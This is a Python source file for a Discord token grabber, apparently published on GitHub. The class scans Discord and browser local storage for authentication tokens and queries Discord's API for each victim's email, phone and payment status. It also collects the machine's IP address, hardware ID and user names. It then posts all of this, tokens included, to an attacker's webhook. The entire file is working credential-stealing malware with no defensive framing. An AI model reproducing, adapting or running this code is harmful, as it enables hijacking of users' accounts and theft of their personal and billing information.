import re
import os
from json import dumps, loads
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
from base64 import b64decode

DEBUG_MODE = False

def debug_print(*arg):
    if DEBUG_MODE:
        print(arg)

class TokenGrab:
    def __init__(self, webhook) -> None:
        debug_print('TokenGrab init')

        self.WEBHOOK = webhook

        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        debug_print(local)
        debug_print(roaming)

        self.paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }
        
        self.info = {
            'user_ip': 'None',
            'user_hwid': 'None',
            'pc_username': 'None',
            'pc_name': 'None',
            'user_path_name': 'None',
            'token_dict': {}}

    def __get_headers(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def __search_token(self, path):
        path +=  '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            #regex to find token in file
            for line in [x.strip() for x in open('%s\\%s' % (path, file_name), errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex,line):
                        tokens.append(token)
        return tokens

    def __get_token(self):
        output = []

        for platform, path in self.paths.items():
            debug_print('%s %s' % (platform, path))
            if not os.path.exists(path):
                debug_print(f'skip {platform} (no path found.)')
                continue
            debug_print(f'found {platform}. Search for token.')

            tokens = self.__search_token(path)

            if len(tokens) > 0:
                for token in tokens:
                    debug_print('found token')
                    self.info['token_dict'][token] = platform
                    output.append(token)
            else:
                debug_print('no token found')
                      

        return output

    def __prepare_webhook(self, tokens):
        ip = self.info['user_ip']
        pc_username = self.info['pc_username']
        pc_name = self.info['pc_name']
        working_ids = []
        working = []
        embeds = []
        platform='NONE'

        debug_print(self.info['token_dict'])
        debug_print('parsing embed')


        for token_ in tokens:
            uid = None

            if not token_.startswith('mfa.'):
                try:
                    uid = b64decode(token_.split(".")[0].encode()).decode()

                except Exception as e:
                    debug_print(e)
                    pass

                if not uid or uid in working_ids:
                    debug_print('continue')
                    continue

            user_data = self.__get_user_data(token_)

            if not user_data:
                debug_print('continue could not find user data')
                continue
            
            working_ids.append(uid)
            working.append(token_)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = self.__get_avatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(self.__has_payment_methods(token_))

            platform = self.info['token_dict'][token_]

            embed = {
                    "color": 0x7289da,
                    "fields": [
                        {
                            "name": "**Account Info**",
                            "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                            "inline": True
                        },
                        {
                            "name": "**PC Info**",
                            "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                            "inline": True
                        },
                        {
                            "name": "**Token**",
                            "value": token_,
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                        "icon_url": avatar_url
                    },
                    "footer": {
                        "text": "github.com/NightfallGT"
                    }
                }
            
            embeds.append(embed)

        return embeds

    def __send_webhook(self, embeds):

        payload = dumps({'content': '', 
                        'embeds':embeds})
        
        debug_print(payload)
        try:
            debug_print(f'sending to webhook {self.WEBHOOK}')
            req = Request(self.WEBHOOK, data=payload.encode(), headers=self.__get_headers())
            urlopen(req)

        except Exception as e:
            debug_print(e)
    
    def __get_user_data(self,token):
        try:
            return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=self.__get_headers(token))).read().decode())

        except Exception as e:
            debug_print(e)

    def __get_ip(self):
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except:
            pass
            debug_print('this is ip:', ip)
        
        return ip        

    def __get_pc_info(self):
        self.info['user_ip'] = self.__get_ip()
        self.info['pc_username'] = os.getenv("UserName")
        self.info['pc_name'] = os.getenv("COMPUTERNAME")
        self.info['user_path_name'] = os.getenv("userprofile").split("\\")[2]

        debug_print(self.info)

    def __get_avatar(self,uid, aid):
        debug_print('get avatar')
        url = 'https://cdn.discordapp.com/avatars/%s/%s.gif' % (uid, aid)
        try:
            urlopen(Request(url))
        except:
            url = url[:-4]
        
        return url

    def __get_hwid(self):
        debug_print('get hwid')
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

    def __has_payment_methods(self,token):
        debug_print('has payment method')
        try:
            return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.__get_headers(token))).read().decode())) > 0)
        except:
            pass

    def start(self):
        self.__get_pc_info()
        tokens = self.__get_token()
        embeds = self.__prepare_webhook(tokens)
        self.__send_webhook(embeds)



    

